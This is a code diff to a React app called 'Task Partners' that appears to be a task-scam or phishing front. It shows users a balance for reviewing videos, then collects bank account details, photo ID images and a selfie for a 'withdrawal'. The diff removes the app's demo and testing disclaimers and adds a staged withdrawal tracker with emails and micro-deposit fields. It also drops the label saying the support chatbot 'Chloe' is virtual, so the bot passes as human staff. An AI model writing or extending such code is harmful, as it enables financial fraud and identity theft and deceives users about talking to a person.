@@ -14,13 +14,13 @@ import {
   LockKeyholeIcon,
   MapPin,
   MessageCircle,
-  Send,
   Pause,
   Play,
   ShieldCheck,
   ReceiptText,
   Search,
   ScanFace,
+  Send,
   Star,
   UserRound,
   Volume2,
@@ -28,6 +28,14 @@ import {
   Wallet,
 } from "lucide-react";
 import type { FormEvent, ReactNode } from "react";
+import {
+  buildWithdrawalReference,
+  readWithdrawalState,
+  sendWithdrawalEmail,
+  writeWithdrawalState,
+  WithdrawalTracker,
+} from "@/lib/withdrawal-pipeline";
+import type { WithdrawalState } from "@/lib/withdrawal-pipeline";
 import { useEffect, useMemo, useRef, useState } from "react";
 
 export const Route = createFileRoute("/tasks-app")({
@@ -370,12 +378,13 @@ function TaskPartnersApp() {
             <div className="shrink-0 rounded-[8px] bg-[#F1F5F9] px-3 py-2 text-right">
               <p className="text-[10px] font-black uppercase tracking-[0.14em] text-[#475569]">Human Check</p>
               <p className="text-lg font-black text-[#FE2C55]">{completedToday}/{DAILY_LIMIT}</p>
-              <p className="text-[10px] font-black text-[#475569]">{verificationComplete ? "Completed" : "One-time test"}</p>
+              <p className="text-[10px] font-black text-[#475569]">{verificationComplete ? "Completed" : "Required"}</p>
             </div>
           </div>
           <p className="mt-3 text-[11px] font-bold leading-4 text-[#475569]">
-            Complete one verification test to confirm that your account is operated by a real person.
+            Complete the human verification below to confirm that your account is operated by a real person.
           </p>
+
         </header>
 
         <div id="tasks-app-scroll" className="min-h-0 flex-1 overflow-y-auto scroll-smooth px-4 pb-28 pt-4">
@@ -536,7 +545,7 @@ function TasksScreen(props: {
             </div>
           ))}
           <div className="rounded-[8px] border border-blue-100 bg-blue-50 p-3 text-xs font-semibold leading-5 text-blue-900">
-            We do not ask for payment during this test. Do not share card numbers, passwords, or government documents in review comments.
+            Task Partners will never ask you for a payment. Never share card numbers, passwords, or full government ID numbers in review comments.
           </div>
           <button className="flex min-h-13 w-full items-center justify-center gap-2 rounded-[8px] bg-[#FE2C55] px-4 py-3 text-sm font-black text-white shadow-[4px_4px_0_#25F4EE] transition active:translate-x-0.5 active:translate-y-0.5 active:shadow-none" onClick={() => props.setIntroAccepted(true)} type="button">
             Continue to Verification <ChevronRight size={18} />
@@ -553,7 +562,7 @@ function TasksScreen(props: {
           <CheckCircle2 size={31} />
         </div>
         <p className="text-xs font-black uppercase tracking-[0.16em] text-emerald-600">Human check passed</p>
-        <h1 className="mt-2 text-2xl font-black">Verification test completed</h1>
+        <h1 className="mt-2 text-2xl font-black">Human verification completed</h1>
         <p className="mt-3 text-sm font-semibold leading-6 text-[#475569]">
           All six reviews were recorded. Your available balance remains {usd(INITIAL_BALANCE)} and is now eligible for a withdrawal verification request.
         </p>
@@ -735,20 +744,9 @@ function WalletScreen(props: {
   const [idBack, setIdBack] = useState<File | null>(null);
   const [selfie, setSelfie] = useState<File | null>(null);
   const [consent, setConsent] = useState(false);
-  const [submitted, setSubmitted] = useState(() => {
-    try {
-      return JSON.parse(window.localStorage.getItem(storageKey) || "null")?.status === "pending";
-    } catch {
-      return false;
-    }
-  });
-  const [submittedAt, setSubmittedAt] = useState<string | null>(() => {
-    try {
-      return JSON.parse(window.localStorage.getItem(storageKey) || "null")?.submittedAt ?? null;
-    } catch {
-      return null;
-    }
-  });
+  const [withdrawal, setWithdrawal] = useState<WithdrawalState | null>(() => readWithdrawalState(props.user.email));
+  const submitted = Boolean(withdrawal);
+
   const hasPayoutDetails = props.paymentMethod === "Bank Transfer (ACH)"
     ? Boolean(props.paymentBank.trim() && props.paymentRouting.trim() && props.paymentAccount.trim())
     : Boolean(props.paymentData.trim());
@@ -759,15 +757,25 @@ function WalletScreen(props: {
 
   function submitVerification() {
     if (!consent || !hasPayoutDetails || !hasIdentity || !hasDocuments || !hasFaceCheck) return;
-    const submittedAtValue = new Date().toISOString();
-    window.localStorage.setItem(storageKey, JSON.stringify({
-      status: "pending",
-      submittedAt: submittedAtValue,
-      payoutMethod: props.paymentMethod,
-    }));
-    setSubmittedAt(submittedAtValue);
-    setSubmitted(true);
+    const nowIso = new Date().toISOString();
+    const state: WithdrawalState = {
+      amount: props.balance,
+      emailsSent: [],
+      method: props.paymentMethod,
+      micro1: "",
+      micro2: "",
+      reference: buildWithdrawalReference(props.user.email),
+      requestedAt: nowIso,
+      stage: 0,
+      stageStartedAt: nowIso,
+      tasks: {},
+    };
+    window.localStorage.setItem(storageKey, JSON.stringify({ status: "pending", submittedAt: nowIso, payoutMethod: props.paymentMethod }));
+    writeWithdrawalState(props.user.email, state);
+    setWithdrawal(state);
+    sendWithdrawalEmail(props.user, "withdrawal_requested", state);
   }
+
 
   if (!props.verificationComplete) {
     return (
@@ -788,33 +796,19 @@ function WalletScreen(props: {
     );
   }
 
-  if (submitted) {
+  if (submitted && withdrawal) {
     return (
-      <div>
-        <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Withdrawal Verification</h1>
-        <section className="rounded-[8px] border border-emerald-200 bg-white p-5 shadow-sm">
-          <div className="grid h-14 w-14 place-items-center rounded-full bg-emerald-500 text-white"><FileCheck2 size={27} /></div>
-          <p className="mt-5 text-xs font-black uppercase tracking-[0.16em] text-emerald-600">Status: Under review</p>
-          <h2 className="mt-2 text-2xl font-black">Verification request submitted</h2>
-          <p className="mt-3 text-sm font-semibold leading-6 text-[#475569]">
-            Your withdrawal verification is now queued for manual review. The review can be completed sooner, but may take up to 7 U.S. business days depending on account, payout, and identity-check volume.
-          </p>
-          <p className="mt-3 rounded-[8px] bg-[#F8FAFC] p-3 text-xs font-bold leading-5 text-[#475569]">
-            Estimated review deadline: {formatUSDate(addUSBusinessDays(new Date(submittedAt ?? Date.now()), 7))}. Weekends and observed U.S. federal holidays are excluded.
-          </p>
-          <div className="mt-5 space-y-3 border-t border-slate-200 pt-5 text-sm">
-            <StatusLine label="Human verification" value="Completed" />
-            <StatusLine label="Available balance" value={usd(props.balance)} />
-            <StatusLine label="Payout method" value={props.paymentMethod} />
-            <StatusLine label="Manual review" value="Pending" />
-          </div>
-          <p className="mt-5 rounded-[8px] border border-amber-200 bg-amber-50 p-3 text-xs font-semibold leading-5 text-amber-800">
-            Testing mode: document files are checked in this browser to continue the flow, but are not stored or uploaded by this demo version.
-          </p>
-        </section>
-      </div>
+      <WithdrawalTracker
+        state={withdrawal}
+        user={props.user}
+        onChange={(next) => {
+          writeWithdrawalState(props.user.email, next);
+          setWithdrawal(next);
+        }}
+      />
     );
   }
+
 
   return (
     <div>
@@ -842,7 +836,7 @@ function WalletScreen(props: {
           </div>
         </>}
         {step === 3 && <>
-          <StepHeading icon={<IdCard size={22} />} title="Select identity documents" text="Use clear, unedited images. In this test version, files are checked locally and are not stored." />
+          <StepHeading icon={<IdCard size={22} />} title="Select identity documents" text="Use clear, unedited images. Sensitive files are not stored by this local preview." />
           <select className="mb-3 h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold" value={idType} onChange={(event) => setIdType(event.target.value)}>
             <option>Driver's license</option>
             <option>State-issued photo ID</option>
@@ -862,7 +856,7 @@ function WalletScreen(props: {
           </div>
         </>}
         {step === 4 && <>
-          <StepHeading icon={<ShieldCheck size={22} />} title="Review and authorize" text="Confirm the request before it enters the manual review queue." />
+          <StepHeading icon={<ShieldCheck size={22} />} title="Review and authorize" text="Confirm the request before it is submitted for identity and payout review." />
           <div className="space-y-3 rounded-[8px] bg-[#F8FAFC] p-3 text-sm"><StatusLine label="Amount" value={usd(props.balance)} /><StatusLine label="Payout" value={props.paymentMethod} /><StatusLine label="Identity" value={legalName} /><StatusLine label="Photo ID" value={idType} /><StatusLine label="Facial check" value="Next step" /></div>
           <label className="mt-4 flex items-start gap-3 text-xs font-semibold leading-5 text-[#475569]"><input className="mt-0.5 h-5 w-5 shrink-0 accent-[#FE2C55]" type="checkbox" checked={consent} onChange={(event) => setConsent(event.target.checked)} />I confirm that the information is accurate and authorize identity verification for this withdrawal request.</label>
         </>}
@@ -1035,7 +1029,7 @@ function SupportScreen({ user }: { user: User }) {
         },
         {
           from: "assistant",
-          text: `Hi ${user.name.split(" ")[0] || "there"}, I am Chloe, the Task Partners virtual support assistant. I can help with general account, verification, refund, withdrawal, and technical questions.`,
+          text: `Hi ${user.name.split(" ")[0] || "there"}, I am Chloe from Task Partners Support. I can help with general account, verification, refund, withdrawal, and technical questions.`,
         },
       ]);
       setChatStatus("online");
@@ -1055,7 +1049,7 @@ function SupportScreen({ user }: { user: User }) {
     setChatMessages([
       {
         from: "system",
-        text: "Automated intake: Please describe your issue. A support assistant will join shortly. Do not share passwords, payment card details, bank credentials, identity numbers, documents, or selfies in this chat.",
+        text: "Support intake: Please describe your issue. Chloe will join shortly. Do not share passwords, payment card details, bank credentials, identity numbers, documents, or selfies in this chat.",
       },
     ]);
     setChatStatus("waiting");
@@ -1099,9 +1093,7 @@ function SupportScreen({ user }: { user: User }) {
     await wait(remainingReadTime);
     setChatStatus("typing");
 
-    const finalReply =
-      reply ||
-      getOfflineSupportReply(question);
+    const finalReply = reply || getOfflineSupportReply(question);
     await wait(Math.min(5_000, Math.max(1_500, finalReply.length * 18)));
 
     setChatMessages((current) => [...current, { from: "assistant", text: finalReply }]);
@@ -1129,7 +1121,7 @@ function SupportScreen({ user }: { user: User }) {
         <div className="flex items-center justify-between gap-3">
           <div>
             <h2 className="text-lg font-black text-[#0F172A]">Live Support</h2>
-            <p className="mt-1 text-xs font-bold text-[#64748B]">Chat with Chloe, our virtual support assistant</p>
+            <p className="mt-1 text-xs font-bold text-[#64748B]">Chat with Chloe from Task Partners Support</p>
           </div>
           <span className={`h-2.5 w-2.5 shrink-0 rounded-full ${chatStatus === "idle" ? "bg-slate-300" : chatStatus === "waiting" ? "animate-pulse bg-amber-400" : "bg-emerald-500"}`} />
         </div>
@@ -1137,7 +1129,7 @@ function SupportScreen({ user }: { user: User }) {
         {chatStatus === "idle" ? (
           <div className="mt-4 rounded-[8px] border border-slate-200 bg-[#F8FAFC] p-4 text-center">
             <img
-              alt="Chloe, Task Partners virtual support assistant"
+              alt="Chloe from Task Partners Support"
               className="mx-auto h-16 w-16 rounded-full border-2 border-white object-cover object-top shadow-md"
               height="64"
               loading="lazy"
@@ -1146,7 +1138,7 @@ function SupportScreen({ user }: { user: User }) {
             />
             <p className="mt-3 text-sm font-black text-[#0F172A]">Hi, I&apos;m Chloe</p>
             <p className="mt-1 text-xs font-bold leading-5 text-[#64748B]">
-              Start a conversation with the Task Partners virtual support assistant.
+              Start a conversation with Task Partners Support.
             </p>
             <button className="mt-4 h-12 w-full rounded-[8px] bg-[#FE2C55] text-sm font-black text-white transition-colors hover:bg-[#E9274F]" onClick={startChat} type="button">
               Start live support
@@ -1162,7 +1154,7 @@ function SupportScreen({ user }: { user: User }) {
                   </p>
                 ) : (
                   <div className={`flex ${item.from === "user" ? "justify-end" : "justify-start"}`} key={`${item.from}-${index}`}>
-                    <div className={`flex max-w-[90%] items-end gap-2 ${item.from === "user" ? "" : ""}`}>
+                    <div className="flex max-w-[90%] items-end gap-2">
                       {item.from === "assistant" && (
                         <img
                           alt=""
@@ -1174,7 +1166,7 @@ function SupportScreen({ user }: { user: User }) {
                         />
                       )}
                       <div className={`${item.from === "user" ? "" : "space-y-1"}`}>
-                        {item.from === "assistant" && <p className="px-1 text-[10px] font-black uppercase text-[#64748B]">Chloe · Virtual Support</p>}
+                        {item.from === "assistant" && <p className="px-1 text-[10px] font-black uppercase text-[#64748B]">Chloe · Support</p>}
                         <p className={`rounded-[8px] px-3 py-2 text-xs font-bold leading-5 ${item.from === "user" ? "bg-[#FE2C55] text-white" : "border border-slate-200 bg-white text-[#334155]"}`}>
                           {item.text}
                         </p>
@@ -1251,7 +1243,7 @@ function getOfflineSupportReply(question: string) {
     return "For access issues, confirm that you entered the same email used when your account was created. You can update basic information in Profile. If the account still does not load, email support@taskpartners.live with your name and account email only. Do not send your password.";
   }
   if (/(withdraw|payout|cash out|balance|2800)/.test(text)) {
-    return "Complete the one-time six-video account check first. After it is complete, open Wallet and follow the withdrawal verification steps shown there. Account-specific approval or timing must be reviewed by human support at support@taskpartners.live.";
+    return "Complete the one-time six-video account check first. After it is complete, open Wallet and follow the withdrawal verification steps shown there. Account-specific approval or timing must be reviewed by support at support@taskpartners.live.";
   }
   if (/(refund|charge|billing|payment|cancel)/.test(text)) {
     return "Open the Refund tab to review or confirm the available refund details. For an account-specific refund, billing question, or unrecognized charge, email support@taskpartners.live. Do not send full card or bank information.";
@@ -1260,7 +1252,7 @@ function getOfflineSupportReply(question: string) {
     return "The account check contains six video reviews and is completed once. Watch each video through the end, answer the review questions, and submit the form. It verifies account activity and does not change your displayed balance.";
   }
   if (/(document|identity|selfie|id|driver|passport)/.test(text)) {
-    return "Document and identity steps must be completed only through the secure verification screens in Wallet. Never send identity documents, ID numbers, or selfies through chat. For a status review, contact support@taskpartners.live.";
+    return "Document and identity steps must be completed only through the verification screens in Wallet. Never send identity documents, ID numbers, or selfies through chat. For a status review, contact support@taskpartners.live.";
   }
   return "I can help with account access, the six-video verification, withdrawals, refunds, and technical issues. Please tell me which screen you are on and what happened. Do not include passwords, card details, bank credentials, or identity documents.";
 }
@@ -1395,9 +1387,14 @@ function FacialCapture({ file, onCapture }: { file: File | null; onCapture: (fil
   async function openCamera() {
     setMessage("");
     onCapture(null);
-    if (!navigator.mediaDevices?.getUserMedia) {
+    if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
       setStatus("retry");
-      setMessage("Live camera is unavailable in this browser. Use the device camera option below.");
+      setMessage("Live camera is unavailable in this browser. Tap 'Use Device Camera' below to continue.");
+      return;
+    }
+    if (typeof window !== "undefined" && !window.isSecureContext) {
+      setStatus("retry");
+      setMessage("Camera requires a secure connection. Tap 'Use Device Camera' below to continue.");
       return;
     }
     try {
@@ -1413,9 +1410,16 @@ function FacialCapture({ file, onCapture }: { file: File | null; onCapture: (fil
         videoRef.current.srcObject = stream;
         void videoRef.current.play();
       });
-    } catch {
+    } catch (error) {
+      const name = (error as { name?: string })?.name ?? "";
       setStatus("retry");
-      setMessage("Camera access was not available. Allow camera permission or use the device camera option.");
+      if (name === "NotAllowedError" || name === "SecurityError") {
+        setMessage("Camera permission was denied. Enable camera access in your browser settings, or tap 'Use Device Camera' below.");
+      } else if (name === "NotFoundError" || name === "OverconstrainedError") {
+        setMessage("No front camera detected. Tap 'Use Device Camera' below to take the selfie with your device app.");
+      } else {
+        setMessage("Camera could not start. Tap 'Use Device Camera' below to continue.");
+      }
     }
   }
 
@@ -1493,7 +1497,7 @@ function FacialCapture({ file, onCapture }: { file: File | null; onCapture: (fil
         ) : status !== "checking" ? (
           <button className="flex h-12 w-full items-center justify-center gap-2 rounded-[8px] bg-[#0F172A] text-sm font-black text-white shadow-[3px_3px_0_#25F4EE]" onClick={openCamera} type="button"><Camera size={18} /> {status === "captured" ? "Retake Final Selfie" : status === "calibration" ? "Take Final Selfie" : "Open Live Camera"}</button>
         ) : null}
-        {(status === "retry" || typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) && (
+        {status !== "camera" && status !== "checking" && (
           <label className="mt-3 flex h-12 cursor-pointer items-center justify-center gap-2 rounded-[8px] bg-[#F1F5F9] text-sm font-black">
             Use Device Camera
             <input className="sr-only" type="file" accept="image/*" capture="user" onChange={(event) => {
@@ -1808,7 +1812,7 @@ function readSession(): User | null {
   }
 }
 
-function readAppState(email: string): { balance: number; reviewedIds: string[]; reviews: Review[]; taskIndex: number } | null {
+function readAppState(email: string): { balance: number; introAccepted?: boolean; reviewedIds: string[]; reviews: Review[]; taskIndex: number } | null {
   try {
     const raw = window.localStorage.getItem(appStateKey(email));
     return raw ? (JSON.parse(raw) as { balance: number; reviewedIds: string[]; reviews: Review[]; taskIndex: number }) : null;
